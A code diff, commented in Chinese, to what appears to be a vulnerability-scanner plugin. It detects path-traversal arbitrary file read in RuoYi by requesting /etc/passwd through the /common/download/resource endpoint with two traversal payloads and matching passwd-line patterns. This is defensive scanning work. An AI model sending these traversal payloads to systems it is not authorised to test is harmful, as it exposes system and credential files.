@@ -3,11 +3,17 @@
 #   攻击者构造 ../ 路径穿越可读取任意文件（如 /etc/passwd、/proc/self/environ）。
 # 本插件仅做存在性验证：读取 /etc/passwd，检测响应是否含真实 passwd 文件特征。
 # D4 改造（2026-07-18）：删除签名 marker，改真实 /etc/passwd 特征判定，兼容签名靶场与真实若依。
+import re
+
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import join_url
 from lib.colors import no, ok
 from lib.reporter import emit
 from plugins.base import PluginBase
+
+# /etc/passwd 行格式：name:<密码字段>:uid:gid:...（密码字段见 _is_passwd_file 注释）。
+# 模块级预编译：判定函数每次 verify 最多调用两次，避免重复编译
+_PASSWD_RE = re.compile(r"^([a-zA-Z_][a-zA-Z0-9_-]*):[^:\n]*:(\d+):(\d+):", re.MULTILINE)
 
 
 def _is_passwd_file(text):
@@ -25,11 +31,10 @@ def _is_passwd_file(text):
     if not text:
         return False, "空响应"
 
-    # 提取所有形如 name:x:uid:gid:... 的行
-    import re
-
-    passwd_pattern = re.compile(r"^([a-zA-Z_][a-zA-Z0-9_-]*):x:(\d+):(\d+):", re.MULTILINE)
-    matches = passwd_pattern.findall(text)
+    # 提取所有形如 name:<password field>:uid:gid:... 的行。
+    # 密码字段不限定为 x：锁定账户为 *、无密码账户为空、部分发行版为密码哈希，
+    # 只匹配 :x: 会让这些目标上的真实漏洞被漏判（false negative）
+    matches = _PASSWD_RE.findall(text)
     if not matches:
         return False, "响应不含 passwd 格式行"
 
@@ -39,8 +44,9 @@ def _is_passwd_file(text):
 
     # 强特征：含 root 账户（uid=0）
     has_root = any(name == "root" and uid == "0" for name, uid, gid in matches)
-    # 次强特征：含常见系统账户（daemon/bin/sys/nobody/mail 等）
-    system_accounts = {"root", "daemon", "bin", "sys", "nobody", "mail", "ftp", "www-data"}
+    # 次强特征：含常见系统账户（daemon/bin/sys/nobody/mail 等）。
+    # 不含 root：否则 has_system 恒被 has_root 蕴含，「或」条件里 root 分支形同虚设
+    system_accounts = {"daemon", "bin", "sys", "nobody", "mail", "ftp", "www-data"}
     has_system = any(name in system_accounts for name, uid, gid in matches)
 
     if has_root or has_system:
@@ -88,55 +94,90 @@ class RuoyiFileReadPathPlugin(PluginBase):
     supports_waf_bypass = True
 
     def verify(self, target, session):
-        """用路径穿越 payload 读取 /etc/passwd，按真实文件特征判定漏洞
+        """用多级路径穿越 payload 读取 /etc/passwd，按真实文件特征判定漏洞
 
-        与 file_read 插件的差异：payload 为相对穿越（resource=../../../etc/passwd），
-        且判定基于 /etc/passwd 标准行格式（username:x:uid:gid）而非简单的 root 子串
+        与 file_read 插件的差异：载荷同时尝试深层 /profile/../ 与 3 层相对穿越，
+        判定基于 /etc/passwd 标准行格式（username:<密码字段>:uid:gid）而非简单 root 子串
         @param target: 目标主机，用于拼接下载接口地址
         @param session: 复用的 HTTP 会话对象
-        @return: ScanResult——200 且响应含 ≥2 个 passwd 账户行（root/系统账户）为 CONFIRMED，否则 SAFE
+        @return: ScanResult——200 且响应含 ≥2 个 passwd 账户行（root/系统账户）为 CONFIRMED；
+                 有 200 但无特征或 400/403/404 为 SAFE；重定向/其他状态与网络异常为 UNKNOWN
         """
-        # 路径穿越 payload：从若依默认资源目录向上穿越读 /etc/passwd
-        url = join_url(target, "/common/download/resource?resource=../../../etc/passwd")
-        try:
-            resp = session.get(url)
-        except Exception as e:
+        # 穿越深度候选：先试与 reproduce/兄弟插件一致的深层 /profile/ 载荷（部署层级更深也能到 /），
+        # 再回退 3 层相对穿越（部分部署对 /profile/ 前缀有额外处理）
+        resources = [
+            "/profile/../../../../../../../etc/passwd",
+            "../../../etc/passwd",
+        ]
+        requests_seen = []  # (url, code) 已拿到响应的请求
+        last_200_text = None  # 最近一次 200 响应正文（用于无特征时输出判据原因）
+        for resource in resources:
+            url = join_url(target, f"/common/download/resource?resource={resource}")
+            try:
+                resp = session.get(url)
+            except Exception:
+                # 单个深度请求失败不立即判 UNKNOWN：继续尝试下一深度
+                requests_seen.append((url, 0))
+                continue
+
+            text = resp.text or ""
+            code = getattr(resp, "status_code", 0)
+            requests_seen.append((url, code))
+
+            # 200 + 真实 /etc/passwd 特征 → CONFIRMED
+            if code == 200:
+                last_200_text = text
+                hit, evidence = _is_passwd_file(text)
+                if hit:
+                    emit(ok("存在任意文件读取漏洞（路径穿越）"))
+                    return ScanResult(
+                        kind="vuln",
+                        name=self.name,
+                        severity=self.severity,
+                        status=STATUS_CONFIRMED,
+                        url=url,
+                        evidence=evidence,
+                        fix=self.fix,
+                        extra={
+                            "vuln_type": "arbitrary_file_read",
+                            "payload_class": "traversal_etc_passwd",
+                            "plugin_name": "file_read_path",
+                        },
+                    )
+
+        last_url = requests_seen[-1][0] if requests_seen else join_url(target, "/common/download/resource")
+        codes = [code for _, code in requests_seen]
+
+        # 全部请求网络异常 → UNKNOWN（测不到 ≠ 安全）
+        if not any(code for code in codes):
             emit(no("任意文件读取（网络异常）"))
-            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
+            return ScanResult(
+                kind="vuln",
+                name=self.name,
+                status=STATUS_UNKNOWN,
+                url=last_url,
+                evidence="所有穿越载荷请求均网络异常，无法判定",
+            )
 
-        text = resp.text or ""
-        code = getattr(resp, "status_code", 0)
-
-        # 200 + 真实 /etc/passwd 特征 → CONFIRMED
-        if code == 200:
-            hit, evidence = _is_passwd_file(text)
-            if hit:
-                emit(ok("存在任意文件读取漏洞（路径穿越）"))
-                return ScanResult(
-                    kind="vuln",
-                    name=self.name,
-                    severity=self.severity,
-                    status=STATUS_CONFIRMED,
-                    url=url,
-                    evidence=evidence,
-                    fix=self.fix,
-                    extra={
-                        "vuln_type": "arbitrary_file_read",
-                        "payload_class": "traversal_etc_passwd",
-                        "plugin_name": "file_read_path",
-                    },
-                )
-
-        # 400/403/404 → 拦截或端点不存在；200 但无特征 → 安全
-        # 200 分支重复调用判据函数仅为取用其 evidence 文本作安全原因，避免另写一套判定逻辑
-        if code in (400, 403):
-            reason = f"HTTP {code} 路径被拦截"
-        elif code == 404:
-            reason = "HTTP 404 端点不存在"
-        elif code == 200:
-            _, reason = _is_passwd_file(text)
+        # 有 200 响应但全部无 passwd 特征 → SAFE（该深度读不到目标文件）
+        if 200 in codes:
+            # 复跑判据函数仅为取用其 evidence 文本作安全原因，避免另写一套判定逻辑
+            _, reason = _is_passwd_file(last_200_text or "")
             reason = f"200 但{reason}"
+        # 全部为已识别的拦截/不存在状态 → SAFE
+        elif all(code in (400, 403, 404) for code in codes if code):
+            reason = f"HTTP {codes[-1]} 路径被拦截或端点不存在"
         else:
-            reason = f"HTTP {code} 非 200 响应"
+            # 重定向/5xx 等：响应可能被网关或登录跳转改写，passwd 检查天然失效，
+            # 不能据此判 SAFE（历史缺陷：301/302 与未知状态全部落入 SAFE）
+            emit(no(f"任意文件读取（HTTP {codes[-1]} 非判定状态）"))
+            return ScanResult(
+                kind="vuln",
+                name=self.name,
+                status=STATUS_UNKNOWN,
+                url=last_url,
+                evidence=f"HTTP {codes[-1]} 非 200/400/403/404，响应可能被网关改写，无法判定",
+            )
+
         emit(no(f"不存在任意文件读取漏洞（{reason}）"))
-        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=reason)
+        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=last_url, evidence=reason)
